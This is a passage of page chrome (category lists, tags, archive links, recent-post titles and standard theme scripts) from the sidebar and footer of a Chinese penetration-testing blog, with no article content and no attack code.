class="level-item">提权</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="level-start"><span class="level-item">文件上传</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%9F%E7%90%86/"><span class="level-start"><span class="level-item">服务器原理</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="level-start"><span class="level-item">渗透测试</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/recurrent/"><span class="level-start"><span class="level-item">漏洞复现</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"><span class="level-start"><span class="level-item">漏洞挖掘</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BB%95%E8%BF%87/"><span class="level-start"><span class="level-item">绕过</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"><span class="level-start"><span class="level-item">问题汇总</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%9D%A2%E8%AF%95/"><span class="level-start"><span class="level-item">面试</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-01T07:39:36.000Z">2021-02-01</time></p><p class="title"><a href="/2021/02/01/CVE-2021-3156-Sudo%E6%8F%90%E6%9D%83/">CVE-2021-3156 Sudo提权</a></p><p class="categories"><a href="/categories/%E6%8F%90%E6%9D%83/">提权</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-29T05:24:31.000Z">2021-01-29</time></p><p class="title"><a href="/2021/01/29/Selenium%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">Selenium使用教程</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-29T04:22:09.000Z">2021-01-29</time></p><p class="title"><a href="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/">FckEditor编辑器上传漏洞getshel总结</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-25T09:50:55.000Z">2021-01-25</time></p><p class="title"><a href="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/">JumpServer 远程命令执行-2021</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-23T09:21:22.000Z">2021-01-23</time></p><p class="title"><a href="/2021/01/23/%E5%85%B3%E9%97%AD%E5%B8%B8%E8%A7%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84HSTS%E5%8A%9F%E8%83%BD/">关闭常见浏览器的HSTS功能</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/10/"><span class="level-start"><span class="level-item">十月 2020</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/09/"><span class="level-start"><span class="level-item">九月 2020</span></span><span class="level-end"><span class="level-item tag">20</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">八月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">七月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">五月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">二月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">一月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/11/"><span class="level-start"><span class="level-item">十一月 2019</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/10/"><span class="level-start"><span class="level-item">十月 2019</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/08/"><span class="level-start"><span class="level-item">八月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/0day/"><span class="tag">0day</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Android/"><span class="tag">Android</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVE/"><span class="tag">CVE</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Hexo/"><span class="tag">Hexo</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JAVA/"><span class="tag">JAVA</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Mac/"><span class="tag">Mac</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Redis/"><span class="tag">Redis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span class="tag">SQL注入</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SpringBoot/"><span class="tag">SpringBoot</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ThinkCMF/"><span class="tag">ThinkCMF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/XSS/"><span class="tag">XSS</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hexo/"><span class="tag">hexo</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux/"><span class="tag">linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mimikatz/"><span class="tag">mimikatz</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/redis/"><span class="tag">redis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssrf/"><span class="tag">ssrf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web%E6%B8%97%E9%80%8F/"><span class="tag">web渗透</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows/"><span class="tag">windows</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xposed/"><span class="tag">xposed</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F/"><span class="tag">人生感悟</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%85%8D%E6%9D%80/"><span class="tag">免杀</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">反序列化</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%90%8E%E9%97%A8/"><span class="tag">后门</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AD%90%E7%B3%BB%E7%BB%9F/"><span class="tag">子系统</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8F%90%E6%9D%83/"><span class="tag">提权</span><span class="tag">8</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">文件上传</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%9F%E7%90%86/"><span class="tag">服务器原理</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"><span class="tag">未授权访问</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B3%9B%E5%BE%AEOA/"><span class="tag">泛微OA</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%97%E9%80%8F/"><span class="tag">渗透</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%A0%B4%E8%A7%A3/"><span class="tag">破解</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BB%95waf/"><span class="tag">绕waf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9D%A2%E8%AF%95/"><span class="tag">面试</span><span class="tag">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget" data-type="adsense"><div class="card-content"><div class="menu"><h3 class="menu-label">广告</h3><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="11" data-ad-slot="11" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo2.png" alt="B0urne &#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2021 B0urne</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">共<span id="busuanzi_value_site_uv">0</span>个访客</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>